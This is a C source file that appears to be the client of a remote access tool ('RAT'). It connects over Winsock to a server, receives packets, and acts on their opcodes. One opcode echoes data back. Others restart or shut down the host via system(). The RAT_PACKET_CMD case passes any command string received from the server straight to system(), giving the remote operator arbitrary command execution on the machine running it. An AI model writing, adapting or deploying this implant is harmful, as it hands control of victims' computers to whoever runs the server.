#include "client.h"

#include "commands.h"
#include "log.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int client(int debug) {
  AddrInfo *result, *ptr, hints;
  result = ptr = NULL;
  setaddrinfo(&hints, CLIENT);
  if (getaddrinfo(LOCAL_HOST, DEFAULT_PORT, &hints, &result) != 0) {
    LOG_DEBUG("getaddrinfo failed with error: %d", WSAGetLastError());
    return 1;
  }
  SOCKET server = INVALID_SOCKET;
  if (ptr == result) {
    LOG_DEBUG("equal");
  } else
    ptr = result;
  server = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
  if (server == INVALID_SOCKET) {
    LOG_DEBUG("socket creating failed with error %d", WSAGetLastError());
    freeaddrinfo(result);
    return 1;
  }
  if (connect(server, result->ai_addr, (int)ptr->ai_addrlen) == SOCKET_ERROR) {
    closesocket(server);
    server = INVALID_SOCKET;
  }
  freeaddrinfo(result);
  if (server == INVALID_SOCKET) {
    LOG_DEBUG("error: unable to connect to the server");
    return 1;
  }
  char buf[DEFAULT_BUFLEN];
  ratpacket_t *p = (ratpacket_t *)buf;
  while (1) {
    int sentbytes = recv(server, buf, sizeof(ratpacket_t), 0);
    if (sentbytes == 0) {
      LOG_DEBUG("closing connection...");
      return 1;
    }
    if (sentbytes < 0) {
      LOG_DEBUG("recv failed with %d", WSAGetLastError());
      closesocket(server);
      return 1;
    }
    switch (p->op) {
    case RAT_PACKET_ECHO:
      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
      LOG_DEBUG("arrived echo packet with message: %s", p->data);
      if (send(server, (char *)p, sizeof(*p) + p->data_len, 0) ==
          SOCKET_ERROR) {
        LOG_DEBUG("send failed with %d", WSAGetLastError());
        closesocket(server);
        return 1;
      }
      LOG_DEBUG("echo completed\n");
      break;
    case RAT_PACKET_RESTART:
      system(RESTART_STR);
      break;
    case RAT_PACKET_SHUTDOWN:
      system(SHUTDOWN_STR);
      break;
    case RAT_PACKET_CMD:
      sentbytes = recv(server, (char *)p->data, p->data_len, 0);
      LOG_DEBUG("arrived cmd packet with message: %s", p->data);
      system((char *)p->data);
      LOG_DEBUG("cmd packet completed");
      break;
    case RAT_PACKET_DISCONNECT:
      goto DONE;
    default:
      LOG_DEBUG("unimplemented opcode %s (%d)", rat_opcode_to_str(p->op),
                p->op);
      break;
    }
  }
DONE:
  if (shutdown(server, SD_SEND) == SOCKET_ERROR) {
    if (debug)
      printf("shutdown failed, error: %d", WSAGetLastError());
    closesocket(server);
    return 1;
  }
  closesocket(server);
  return 0;
}